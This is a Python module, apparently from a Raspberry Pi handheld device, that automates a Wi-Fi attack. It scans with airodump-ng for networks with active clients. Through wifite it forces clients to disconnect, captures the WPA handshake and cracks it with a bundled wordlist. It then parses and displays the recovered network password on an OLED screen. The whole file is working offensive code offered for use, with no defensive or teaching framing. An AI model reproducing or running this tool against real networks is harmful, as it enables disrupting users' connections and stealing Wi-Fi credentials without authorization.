# modules/attack_handshake.py
import os
import re
import signal
import subprocess
import time
import queue
import threading
import pty
import select
import RPi.GPIO as GPIO

import config
from gui import oled_menu

# Archivo de palabras clave (Wordlist)
CURRENT_DIR   = os.path.dirname(os.path.abspath(__file__))
WORDLIST_PATH = os.path.join(CURRENT_DIR, "wordlist.txt")


# ------------------------------------------------------------------ #
#  UTILIDADES                                                        #
# ------------------------------------------------------------------ #
def clean_ansi(text):
    """Elimina códigos de escape ANSI y normaliza retornos de carro."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text).replace('\r', '\n')


def stop_process(proc):
    """Termina de forma segura un grupo de procesos."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            time.sleep(0.3)
            if proc.poll() is None:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass


def pty_reader(master_fd, out_queue, stop_event):
    """Lee la salida de la PTY y la mete en la cola (evita buffering)."""
    while not stop_event.is_set():
        try:
            r, _, _ = select.select([master_fd], [], [], 0.3)
            if master_fd in r:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                text = clean_ansi(data.decode("utf-8", errors="ignore"))
                for chunk in text.split("\n"):
                    chunk = chunk.strip()
                    if chunk:
                        out_queue.put(chunk)
        except Exception:
            break
    try:
        os.close(master_fd)
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  ESCANEO PREVIO                                                    #
# ------------------------------------------------------------------ #
def get_targets():
    """Escanea el entorno local y extrae objetivos detectados."""
    oled_menu.show_message("ESCANEANDO...", "Buscando objetivos", "Espere un momento")

    subprocess.run("sudo rm -f /tmp/scan_handshake*", shell=True,
                   stderr=subprocess.DEVNULL)

    cmd = (f"sudo timeout 15 airodump-ng {config.INTERFACE} "
           f"--write /tmp/scan_handshake --output-format csv")
    subprocess.run(cmd, shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    redes = []
    scan_file = "/tmp/scan_handshake-01.csv"

    if os.path.exists(scan_file):
        try:
            with open(scan_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                parts = content.split("Station MAC")
                ap_lines = parts[0].split("\n")

                clients = []
                if len(parts) > 1:
                    clients = [
                        l.split(",")[5].strip()
                        for l in parts[1].split("\n")
                        if len(l.split(",")) > 5
                    ]

                for line in ap_lines:
                    row = line.split(",")
                    if len(row) > 13 and ":" in row[0] and "BSSID" not in row[0]:
                        bssid = row[0].strip()
                        ssid  = row[13].strip() or "Oculta"
                        if bssid in clients:
                            redes.append({
                                "ssid": ssid, "bssid": bssid, "ch": row[3].strip()
                            })
        except Exception as e:
            print(f"[!] Error leyendo captura: {e}")

    return redes


# ------------------------------------------------------------------ #
#  LANZAR WIFITE CON PTY                                             #
# ------------------------------------------------------------------ #
def run_wifite_handshake(target_bssid):
    """Lanza wifite con PTY para leer su salida en tiempo real."""
    cmd = [
        "sudo", "wifite",
        "-i", config.INTERFACE,
        "-b", target_bssid,
        "--no-pmkid",
        "--dict", WORDLIST_PATH,
        "--kill",
        "--new-hs",
    ]

    master, slave = pty.openpty()

    proc = subprocess.Popen(
        cmd,
        stdin=slave,
        stdout=slave,
        stderr=slave,
        preexec_fn=os.setsid,
        close_fds=True,
    )
    os.close(slave)

    return proc, master


# ------------------------------------------------------------------ #
#  CLASIFICADOR DE FASES                                             #
# ------------------------------------------------------------------ #
_PATRONES_FASE = [
    ("DEAUTH",     re.compile(r"deauth|disconnect|force.*reconnect",
                              re.IGNORECASE)),
    ("CAPTURADO",  re.compile(r"handshake.*(captur|saved|written)|"
                              r"eapol.*captur", re.IGNORECASE)),
    ("CRACKEANDO", re.compile(r"crack|trying|testing|reading wordlist|"
                              r"dictionary|brute|keys tried", re.IGNORECASE)),
    ("ESCANEANDO", re.compile(r"scan|looking for|enumerating|found \d+ client",
                              re.IGNORECASE)),
]


def _detectar_fase(line, fase_actual):
    """Devuelve la fase según la línea. Solo avanza, nunca retrocede."""
    orden = {"ESCANEANDO": 1, "DEAUTH": 2, "CAPTURADO": 3, "CRACKEANDO": 4}

    for nombre, patron in _PATRONES_FASE:
        if patron.search(line):
            if orden.get(nombre, 0) >= orden.get(fase_actual, 0):
                return nombre
    return fase_actual


# ------------------------------------------------------------------ #
#  BUCLE PRINCIPAL                                                   #
# ------------------------------------------------------------------ #
def start_handshake_attack_loop():
    """Bucle principal del módulo Handshake con UI normalizada."""
    if not config.INTERFACE:
        oled_menu.show_message("ERROR INTERFAZ", "No hay tarjeta", "en modo monitor")
        time.sleep(2)
        return

    wifi_list = get_targets()

    items_menu = ["<- VOLVER"]
    if wifi_list:
        items_menu += [f"{red['ssid']}" for red in wifi_list]
    else:
        items_menu.append("Sin clientes activos")

    estado    = "LISTA"
    index     = 0
    target    = None
    clave_final = ""
    fase      = "ESCANEANDO"

    wifite_proc = None
    out_queue   = None
    reader_stop = None

    # Regex para capturar la clave (múltiples formatos de wifite)
    RE_KEY = re.compile(
        r"(?:PSK \(password\)|Cracked WPA Handshake PSK|PSK|KEY)"
        r"\s*[:=]\s*(.+)$",
        re.IGNORECASE,
    )
    RE_FIN = re.compile(r"finished|exiting|quitting|stopping",
                        re.IGNORECASE)

    # Textos que se muestran en la OLED según la fase
    TEXTO_FASE = {
        "ESCANEANDO": "Escaneando red",
        "DEAUTH":     "Deauth enviado",
        "CAPTURADO":  "Handshake capturado",
        "CRACKEANDO": "Crackeando PSK",
    }

    try:
        while True:
            # ==================================================== #
            # ESTADO 1: MENÚ DE SELECCIÓN                          #
            # ==================================================== #
            if estado == "LISTA":
                oled_menu.draw_menu("HANDSHAKE (WIFITE)", items_menu, index)

                if GPIO.input(config.BTN_UP) == GPIO.LOW:
                    index = (index - 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_DOWN) == GPIO.LOW:
                    index = (index + 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)

                    if index == 0:
                        return

                    if wifi_list and index <= len(wifi_list):
                        target      = wifi_list[index - 1]
                        clave_final = ""
                        fase        = "ESCANEANDO"

                        oled_menu.show_message("INICIANDO...", target['ssid'],
                                               "Esperando EAPOL...")

                        # Lanzar wifite con PTY
                        wifite_proc, master_fd = run_wifite_handshake(target['bssid'])

                        # Cola + hilo lector
                        out_queue   = queue.Queue()
                        reader_stop = threading.Event()
                        t = threading.Thread(
                            target=pty_reader,
                            args=(master_fd, out_queue, reader_stop),
                            daemon=True,
                        )
                        t.start()

                        estado = "ATACANDO"
                        time.sleep(0.3)

            # ==================================================== #
            # ESTADO 2: ATAQUE EN CURSO                            #
            # ==================================================== #
            elif estado == "ATACANDO":
                # Procesar toda la cola
                while True:
                    try:
                        line = out_queue.get_nowait()
                    except queue.Empty:
                        break

                    # Actualizar fase (solo avanza)
                    fase = _detectar_fase(line, fase)

                    # Capturar clave (prioridad alta)
                    m = RE_KEY.search(line)
                    if m:
                        clave_final = m.group(1).strip()
                        # Limpiar comillas o restos
                        clave_final = clave_final.strip("'\"")
                        fase = "CRACKEANDO"

                    # Fin del ataque
                    if RE_FIN.search(line):
                        stop_process(wifite_proc)
                        if reader_stop:
                            reader_stop.set()
                        time.sleep(0.5)
                        estado = "RESULTADO"
                        break

                # --- Render: una sola línea con la fase actual ---
                if estado == "ATACANDO":
                    oled_menu.clear_screen()

                    # Header invertido
                    oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
                    oled_menu.draw.text((3, 0), target['ssid'][:16],
                                        font=oled_menu.font_title, fill=0)

                    # Cronómetro
                    # (opcional, descomenta si lo quieres)
                    # elapsed = int(time.time() - inicio)
                    # oled_menu.draw.text((2, 16), f"{elapsed}s",
                    #                     font=oled_menu.font_small, fill=255)

                    # Fase actual (grande, centrada)
                    texto = TEXTO_FASE.get(fase, "Trabajando...")
                    tw, _ = oled_menu._text_size(texto, oled_menu.font_title)
                    x = max(0, (oled_menu.W - tw) // 2)
                    oled_menu.draw.text((x, 26), texto,
                                        font=oled_menu.font_title, fill=255)

                    # Footer
                    oled_menu.draw.text((2, 56), "SELECT: cancelar",
                                        font=oled_menu.font_small, fill=255)

                    oled_menu.refresh()

                # Cancelación con SELECT
                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    stop_process(wifite_proc)
                    if reader_stop:
                        reader_stop.set()
                    oled_menu.show_message("CANCELADO", "Ataque detenido",
                                           "por el usuario")
                    time.sleep(1.5)
                    return

            # ==================================================== #
            # ESTADO 3: RESULTADO                                  #
            # ==================================================== #
            elif estado == "RESULTADO":
                oled_menu.clear_screen()

                oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
                oled_menu.draw.text((2, 0), f"RED: {target['ssid'][:14]}",
                                    font=oled_menu.font_title, fill=0)

                if clave_final:
                    oled_menu.draw.text((2, 18), "CLAVE:",
                                        font=oled_menu.font_small, fill=255)
                    oled_menu.draw_wrapped_text(clave_final, 30, max_chars=20)
                else:
                    oled_menu.draw.text((2, 20), "Sin clave",
                                        font=oled_menu.font, fill=255)
                    oled_menu.draw.text((2, 34), "Handshake no crackeado",
                                        font=oled_menu.font_small, fill=255)

                oled_menu.draw.text((2, 56), "SELECT: volver",
                                    font=oled_menu.font_small, fill=255)
                oled_menu.refresh()

                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    return

            time.sleep(0.05)

    finally:
        stop_process(wifite_proc)
        if reader_stop:
            reader_stop.set()
